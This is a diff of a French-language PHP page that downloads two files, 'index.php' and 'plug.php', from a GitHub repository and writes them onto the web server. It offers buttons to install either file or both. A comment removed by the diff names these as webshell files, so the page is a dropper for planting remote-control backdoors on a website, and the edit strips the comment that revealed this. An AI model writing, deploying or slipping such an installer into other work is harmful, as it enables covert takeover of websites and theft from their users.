@@ -1,5 +1,4 @@
 <?php
-// Fonction pour télécharger un fichier depuis une URL
 function download_file($url, $destination) {
     $content = file_get_contents($url);
     if ($content !== false) {
@@ -9,18 +8,14 @@ function download_file($url, $destination) {
     return false;
 }
 
-// URL des fichiers webshell à télécharger
 $files = [
     'index.php' => 'https://raw.githubusercontent.com/tucommenceapousser/wshwp/main/index.php',
     'plug.php' => 'https://raw.githubusercontent.com/tucommenceapousser/wshwp/main/plug.php',
 ];
 
-// Variable pour stocker les messages
 $message = "";
 
-// Gestion des actions soumises
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Installer index.php
     if (isset($_POST['install_index'])) {
         if (download_file($files['index.php'], 'index.php')) {
             $message = "<div class='success'>index.php a été installé avec succès.</div>";
@@ -29,7 +24,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Installer plug.php
     if (isset($_POST['install_plug'])) {
         if (download_file($files['plug.php'], 'plug.php')) {
             $message = "<div class='success'>plug.php a été installé avec succès.</div>";
@@ -38,7 +32,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Installer les deux fichiers
     if (isset($_POST['install_both'])) {
         $success_index = download_file($files['index.php'], 'index.php');
         $success_plug = download_file($files['plug.php'], 'plug.php');
@@ -97,8 +90,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <input type="submit" name="install_plug" value="Installer plug.php">
         <input type="submit" name="install_both" value="Installer les deux">
     </form>
-
-    <!-- Affichage des messages après les actions -->
     <?php if ($message): ?>
         <?php echo $message; ?>
     <?php endif; ?>
